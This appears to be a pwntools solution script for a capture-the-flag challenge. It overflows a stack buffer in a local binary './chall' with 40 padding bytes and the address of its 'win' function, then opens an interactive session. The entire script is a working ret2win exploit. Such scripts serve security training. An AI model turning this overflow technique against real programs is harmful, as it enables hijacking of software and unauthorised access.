from pwn import *

elf = context.binary = ELF('./chall')
p = process()

offset = 40
win = elf.symbols['win']

payload = b'A' * offset + p64(win)

p.sendlineafter(b'> ', payload)
p.interactive()
